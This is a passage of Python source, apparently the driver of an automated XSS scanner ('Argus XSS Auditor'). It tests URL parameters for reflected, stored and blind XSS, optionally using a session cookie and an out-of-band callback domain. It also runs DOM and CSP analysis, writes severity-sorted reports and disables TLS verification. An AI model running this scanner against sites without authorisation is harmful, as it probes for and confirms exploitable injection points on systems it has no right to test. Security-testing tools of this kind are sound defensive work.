            surfaces.append((url, param))
    if len(surfaces) > max_surfaces:
        log.warning(f"  Capping at {max_surfaces} surfaces (had {len(surfaces)})")
        surfaces = surfaces[:max_surfaces]

    outdir.mkdir(parents=True, exist_ok=True)

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Surfaces: {len(surfaces)} (url, param) candidate(s)")
    if headers:
        log.info("  Auth   : headers supplied")
    log.info("")

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if headers:
        session.headers.update(headers)
    session.verify = False

    all_findings: list[XSSFinding] = []
    blind_payloads: list[dict] = []
    csp_surfaces: list[dict] = []
    results: list[dict] = []

    # ── Reflected + stored + blind per surface ─────────────────────────────
    for i, (url, param) in enumerate(surfaces, 1):
        log.info(f"  [{i:>3}/{len(surfaces)}] {url[:70]}  param={param}")
        try:
            baseline, findings, reflection_info = audit_surface(
                session, url, param,
                test_stored=test_stored, oob_domain=oob_domain,
            )
            all_findings.extend(findings)
            if reflection_info:
                blind_payloads.extend(reflection_info.get("blind_payloads", []))
                ctx = reflection_info.get("context", "?")
                status = f"reflected ({ctx})"
                if findings:
                    status += f" → {len(findings)} finding(s)"
                log.info(f"           → {status}")
            else:
                log.info(f"           → not reflected")
            results.append({
                "url": url, "param": param,
                "baseline": baseline.to_dict(),
                "reflection": reflection_info,
                "finding_count": len(findings),
            })
        except Exception as e:
            log.warning(f"           → error: {e}")
            results.append({"url": url, "param": param, "error": str(e)})

    # ── DOM analysis ───────────────────────────────────────────────────────
    if test_dom:
        log.info("")
        log.info("  DOM XSS static analysis...")
        dom_findings = run_dom_analysis(session, outdir)
        all_findings.extend(dom_findings)
        log.info(f"    {len(dom_findings)} DOM finding(s)")

    # ── CSP analysis ───────────────────────────────────────────────────────
    log.info("")
    log.info("  CSP analysis...")
    csp_seen: set[str] = set()
    for url, _ in surfaces:
        host = urllib.parse.urlparse(url).hostname or ""
        if host in csp_seen:
            continue
        csp_seen.add(host)
        resp = _safe_request(session, "GET", f"https://{host}/" if not url.startswith("http") else url, timeout=8)
        if resp:
            csp_surfaces.extend(analyze_csp(resp, url))
    log.info(f"    {len(csp_surfaces)} CSP surface(s)")

    # ── Deduplicate ────────────────────────────────────────────────────────
    seen: set[tuple] = set()
    deduped: list[XSSFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.xss_type, f.context)
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 4), -f.confidence, f.target))

    # ── Write outputs ──────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_severity: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    by_type: dict[str, int] = {}
    by_context: dict[str, int] = {}

    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_type[f.xss_type] = by_type.get(f.xss_type, 0) + 1
        if f.context:
            by_context[f.context] = by_context.get(f.context, 0) + 1

    # Flat candidates
    candidate_lines = [
        f"{f.target}\t{f.param}\t{f.xss_type}\t{f.context}\t{f.severity}\t{f.confidence}\t{f.evidence[:140]}"
        for f in deduped
    ]
    (outdir / "xss_candidates.txt").write_text("\n".join(candidate_lines) + "\n")

    # Confirmed (survived unencoded)
    confirmed = [f for f in deduped if f.confidence >= 70 and f.xss_type in ("reflected", "stored")]
    (outdir / "xss_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.context}\t{f.payload[:150]}"
            for f in confirmed
        ) + "\n"
    )

    # DOM findings
    dom_findings_list = [f for f in deduped if f.xss_type == "dom"]
    (outdir / "xss_dom.txt").write_text(
        "\n".join(
            f"{f.details.get('js_url', f.target)}\t{f.details.get('source', '')}\t{f.details.get('sink', '')}\t{f.evidence[:120]}"
            for f in dom_findings_list
        ) + "\n"
    )

    # Blind payloads
    (outdir / "xss_blind.txt").write_text(
        "\n".join(
            f"{b['target']}\t{b['param']}\t{b['payload']}"
            for b in blind_payloads
        ) + "\n"
    )

    # CSP surfaces
    (outdir / "xss_csp.txt").write_text(
        "\n".join(
            f"{s['target']}\t{s['surface']}\t{s['severity']}\t{s['evidence'][:120]}"
            for s in csp_surfaces
        ) + "\n"
    )

    # JSON report
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "config": {
            "test_stored":   test_stored,
            "test_dom":      test_dom,
            "oob_domain":    oob_domain,
            "authenticated": headers is not None,
            "max_surfaces":  max_surfaces,
        },
        "totals": {
            "urls_input":       len(urls),
            "surfaces_tested":  len(surfaces),
            "total_findings":   len(deduped),
            "confirmed":        len(confirmed),
            "dom_findings":     len(dom_findings_list),
            "blind_payloads":   len(blind_payloads),
            "csp_surfaces":     len(csp_surfaces),
            "critical":         by_severity["CRITICAL"],
            "high":             by_severity["HIGH"],
            "medium":           by_severity["MEDIUM"],
            "low":              by_severity["LOW"],
        },
        "summary": {
            "by_severity": by_severity,
            "by_type":     dict(sorted(by_type.items(), key=lambda kv: -kv[1])),
            "by_context":  dict(sorted(by_context.items(), key=lambda kv: -kv[1])),
        },
        "results":  results,
        "findings": [f.to_dict() for f in deduped],
        "blind_payloads": blind_payloads,
        "csp_surfaces": csp_surfaces,
    }

    json_path = outdir / "xss_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    log.info("")
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<28} {len(deduped):>5} finding(s)")
    log.info(f"    xss_candidates.txt           {len(deduped):>5} candidate(s)")
    log.info(f"    xss_confirmed.txt            {len(confirmed):>5} confirmed")
    log.info(f"    xss_dom.txt                  {len(dom_findings_list):>5} DOM finding(s)")
    log.info(f"    xss_blind.txt                {len(blind_payloads):>5} blind payload(s)")
    log.info(f"    xss_csp.txt                  {len(csp_surfaces):>5} CSP surface(s)")

    log.info("")
    log.info(
        f"  Severity : CRITICAL={by_severity['CRITICAL']}  "
        f"HIGH={by_severity['HIGH']}  MEDIUM={by_severity['MEDIUM']}  "
        f"LOW={by_severity['LOW']}"
    )
    if by_type:
        log.info(f"  Type     : " + " · ".join(f"{k}({v})" for k, v in by_type.items()))
    if by_context:
        log.info(f"  Context  : " + " · ".join(f"{k}({v})" for k, v in by_context.items()))

    if confirmed:
        log.info("")
        log.info("  Confirmed reflected/stored findings:")
        for f in confirmed[:10]:
            log.info(f"    [{f.severity:<8}] {f.xss_type:<10} {f.context:<20} {f.param:<12} {f.target[:50]}")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty_report(outdir: Path, input_file: Path, start: float) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "config": {},
        "totals": {
            "urls_input": 0, "surfaces_tested": 0, "total_findings": 0,
            "confirmed": 0, "dom_findings": 0, "blind_payloads": 0,
            "csp_surfaces": 0, "critical": 0, "high": 0, "medium": 0, "low": 0,
        },
        "summary": {"by_severity": {}, "by_type": {}, "by_context": {}},
        "results": [],
        "findings": [],
        "blind_payloads": [],
        "csp_surfaces": [],
    }
    path = outdir / "xss_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    for name in ("xss_candidates.txt", "xss_confirmed.txt", "xss_dom.txt",
                 "xss_blind.txt", "xss_csp.txt"):
        (outdir / name).write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE TEST
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse

    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "gf_xss.txt"
    if not default_input.exists():
        default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"
    out = base / "output"

    parser = argparse.ArgumentParser(description="Argus XSS Auditor (standalone)")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=out)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--oob-domain", help="OOB domain for blind payloads")
    parser.add_argument("--no-stored", action="store_true")
    parser.add_argument("--no-dom", action="store_true")
    parser.add_argument("--max-surfaces", type=int, default=400)
    args = parser.parse_args()

    headers = {"Cookie": args.cookie} if args.cookie else None

    try:
        run_xss_scan(
            args.input, args.output,
            headers=headers,
            oob_domain=args.oob_domain,
            test_stored=not args.no_stored,
            test_dom=not args.no_dom,
            max_surfaces=args.max_surfaces,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        sys.exit(1)
